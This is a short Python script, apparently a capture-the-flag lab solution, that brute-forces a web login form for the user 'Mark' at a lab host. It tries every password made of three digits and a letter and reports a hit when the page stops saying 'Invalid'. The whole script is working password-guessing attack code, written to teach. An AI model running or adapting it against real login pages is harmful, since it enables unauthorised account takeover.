import requests              # HTTP library — post(), response.text
import string                # string.ascii_uppercase → "ABC...Z"
from itertools import product  # cartesian product without nested loops

# Login endpoint for the lab
url = "http://python.thm/labs/lab1/index.php"

# Account we're attacking
username = "Mark"

# Build candidates: every (number, letter) pair → "000A", "000B", ... "998Z"
# product(range(999), ascii_uppercase) replaces the nested for-loops.
password_list = [f"{str(i).zfill(3)}{letter}"
                 for i, letter in product(range(999), string.ascii_uppercase)]

def brute_force():
    # Try each candidate password one at a time
    for password in password_list:
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)  # submit the login form

        # Success heuristic: page no longer contains "Invalid"
        # (fragile — relies on exact wording of the failure page)
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break  # stop once the password is found
        else:
            print(f"[-] Attempted: {password}")

brute_force()